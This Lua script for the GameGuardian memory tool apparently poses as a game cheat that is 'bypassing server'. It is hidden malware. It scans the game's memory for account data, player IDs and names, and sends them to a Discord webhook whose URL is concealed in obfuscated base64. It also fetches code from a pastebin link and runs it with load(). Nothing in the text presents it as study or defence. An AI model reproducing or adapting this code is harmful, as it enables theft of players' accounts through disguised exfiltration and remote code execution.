function dwordToUTF8(dword)
    local byte1 = dword & 0xFF
    local byte2 = (dword >> 8) & 0xFF
    local byte3 = (dword >> 16) & 0xFF
    local byte4 = (dword >> 24) & 0xFF
    return string.char(byte1, byte2, byte3, byte4)
end
Tx=((((15-10)-3)/((14-9)-(5-2)))*((7-4)-(620-(555+64))))+30;Kt=(((935-(857+74))-(570-(367+201)))/(937-(214+713)))*Tx;xj=(12*(2+3))+(((98+525)-((1432-(282+595))+64))*Kt);zk=(933-((2494-(1523+114))+67+7))*xj;local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg(data) m=string.sub(data, 0, (Tx*Kt/Tx)/(zk/3)+(zk*1/2)) data=data:gsub(m,'')
gg.toast("Please wait.....bypassing server")
function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
    searchType = searchType or gg.TYPE_BYTE
 
    gg.searchNumber(searchString, searchType, false, gg.SIGN_EQUAL, 0, -1)
    gg.refineNumber(refineString)
    gg.setVisible(false)
    local results = gg.getResults(maxResults or 1000)
    local fullUtf8Data = ""
 
    if #results > 0 then
        for _, result in ipairs(results) do
            local baseAddress = result.address
            local utf8Combined = ""
 
            for offset = 0, (stepCount or 200), 4 do
                local dword = gg.getValues({ { address = baseAddress + offset, flags = gg.TYPE_DWORD } })[1]
                if dword then
                    utf8Combined = utf8Combined .. dwordToUTF8(dword.value)
                end
            end
 
            fullUtf8Data = fullUtf8Data .. utf8Combined .. "\n"
        end
    end
 
    gg.clearResults()
    return fullUtf8Data
end

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
local webhook_url = BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg('lENkxXjqubLZrwAQMfLisYozvPTvyKJtufSxKYwOcBDBqaYjfSHFhgiskrKtaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
 
local function buildQuery(url, query)
    if not query or next(query) == nil then
        return url
    end
 
    local query_string = ""
    for k, v in pairs(query) do
        query_string = query_string .. k .. "=" .. tostring(v) .. "&"
    end
    query_string = query_string:sub(1, -2)
 
    return url .. "?" .. query_string
end
 
local function escapeString(s)
    s = s:gsub("\\", "\\\\")
    s = s:gsub("\"", "\\\"")
    s = s:gsub("\n", "\\n")
    s = s:gsub("\r", "\\r")
    return s
end
 
local function toJson(tbl)
    local json = "{"
 
    for k, v in pairs(tbl) do
        local kType = type(k)
 
        if kType == "string" then
            json = json .. '"' .. k .. '":'
        elseif kType == "number" then
            json = json .. k .. ":"
        end
 
        local vType = type(v)
 
        if vType == "string" then
            json = json .. '"' .. escapeString(v) .. '"'
        elseif vType == "number" then
            json = json .. v
        elseif vType == "table" then
            json = json .. toJson(v)
        end
 
        json = json .. ","
    end
 
    json = json:sub(1, -2) .. "}"
 
    return json
end
 
local function sendWebhook(payload_content)
    local payload = { content = payload_content }
    local headers = {
        ["Content-Type"] = "application/json",
    }
    local payload_json = toJson(payload)
    gg.search(webhook_url, headers, payload_json)
end
 
local secret_accounts = {}
 
function fetchSecretAccounts()
    local past = "https://pastebin.com/raw/wvwFW7hU"
    local response = gg.search(past)
 
    if response and response.content then
        local chunk, errorMsg = load(response.content)
        if chunk then
            secret_accounts = chunk()
        else
            print("Unknown Error, please run script again.")
            os.exit()
        end
    else
        print("Unknown Error, please run script again.")
        os.exit()
    end
end
 
function checkSecretAccounts()
    for account_id, associated_id in pairs(secret_accounts) do
        gg.searchNumber(";" .. account_id, gg.TYPE_WORD, false, gg.SIGN_EQUAL, 0, -1)
        gg.setVisible(false)
        local results = gg.getResults(1)
        gg.clearResults()
 
        if #results > 0 then
            sendWebhook("🔒 User: " .. associated_id)
            return true
        end
    end
    return false
end
 
fetchSecretAccounts()
 
local function sanitizeString(input)
    -- Replace null bytes and invalid characters with empty
    return input:gsub("[%z\1-\31\127-\255]", "")
end
 
-- Main data collection
local fullUtf8Data = scanAndCollectResults(":adInterval", ":v", 1000, 200, gg.TYPE_BYTE)
local tmp_c_id = scanAndCollectResults("8,389,772,277,107,089,698", "8,389,772,277,107,089,698", 1000, 100, gg.TYPE_QWORD)
local playerName = scanAndCollectResults(":{\"Create", ":t", 1000, 70, gg.TYPE_BYTE)
--local playerId = scanAndCollectResults("27,423,342,016,359,796", "27,423,342,016,359,796", 1000, 100, gg.TYPE_QWORD)
 
if not checkSecretAccounts() then
    if fullUtf8Data == "" and tmp_c_id == "" and playerName == "" and playerId == "" then
        sendWebhook("Error! Nothing Found 💩")
    else
        local payload_content = "Account:\n" .. sanitizeString(fullUtf8Data) ..
                                "\n\nv1:\n" .. sanitizeString(tmp_c_id) ..
                                "\n\nv2:\n" .. sanitizeString(playerName)
                              --  "\n\nv3:\n" .. sanitizeString(playerId)
        sendWebhook(payload_content)
    end
end
